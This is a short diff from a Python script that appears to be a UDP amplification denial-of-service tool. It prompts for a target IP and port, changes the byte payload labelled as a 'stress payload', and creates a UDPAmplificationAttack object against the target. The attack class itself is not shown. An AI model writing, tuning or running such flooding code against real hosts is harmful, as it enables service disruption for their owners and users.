@@ -53,7 +53,7 @@ if __name__ == "__main__":
     target_port = int(input("Enter target port: "))
     
     # Enhanced UDP server stress payload
-    payload = b"\x01\x02\x03\x04" * 1024 
+    payload = b"\x00\x00" * 1024 
     
     # Create UDPAmplificationAttack instance
     amplification_attack = UDPAmplificationAttack(target_ip, target_port, payload)
